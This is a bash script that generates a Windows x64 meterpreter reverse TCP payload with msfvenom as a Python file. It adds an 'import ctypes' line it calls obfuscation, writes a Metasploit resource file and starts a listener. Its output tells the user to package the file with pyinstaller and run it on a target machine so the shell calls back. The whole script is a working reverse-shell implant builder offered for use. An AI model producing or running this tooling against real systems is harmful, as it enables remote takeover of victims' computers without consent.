#!/bin/bash 


# Colours 
greenColour="\e[0;32m\033[1m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"
endColour="\033[0m\e[0m"



function show_help() {
    echo -e "\n${yellowColour}[USE] $0 <LHOST> <LPORT>${endColour}\n"
    echo -e "${blueColour}Parameters:${endColour}"
    echo -e "  ${greenColour}<LHOST>${endColour}   LOCAL IP"
    echo -e "  ${greenColour}<LPORT>${endColour}   LOCAL PORT"
    echo -e "\n${purpleColour}Example:${endColour} $0 192.168.1.20 443\n"
    exit 1
}



function main() {
    # Debug: mostrar valores de los parÃ¡metros
    echo -e "\n${yellowColour}[DEBUG] Param 1: '$1'${endColour}"
    echo -e "${yellowColour}[DEBUG] Param 2: '$2'${endColour}\n"
    # ComprobaciÃ³n de parÃ¡metros
    if [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
        show_help
    fi

    if [ -z "$1" ] || [ -z "$2" ]; then
        echo -e "\n${redColour}[!] Missing parameters.${endColour}\n"
        show_help
    fi

    echo -e "\n${blueColour}[+] Creating the .py using msfvenom ...${endColour}\n"
    sleep 1

    msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=$1 lport=$2 -f python-reflection -o shell.py

    echo -e "\n${blueColour}[+] Obfuscating the payload ...${endColour}\n"
    sleep 1

    echo  -e "import ctypes\n$(cat shell.py)" > shell.py

    echo -e "\n${greenColour}[+] Obfuscated shell.py created successfully.${endColour}\n"

    echo -e "\n${blueColour}[+] Creating the msf.rc file ...${endColour}\n"
    sleep 1

    echo -e "use payload windows/x64/meterpreter_reverse_tcp\nset lhost $1\nset lport $2\nexploit" > msf.rc

    echo -e "\n${yellowColour}[+] After making the exe using pyinstaller, you can execute the exe in the target machine and wait for the connection.${endColour}\n"
    sleep 2
    echo -e "${purpleColour}[+] The shell.py is located in $(pwd)/shell.py${endColour}\n"
    sleep 1

    echo -e "${turquoiseColour}[+] Starting listener with meterpreter ...${endColour}\n"
    sleep 1
    msfconsole -r ./msf.rc 

}
main "$@"
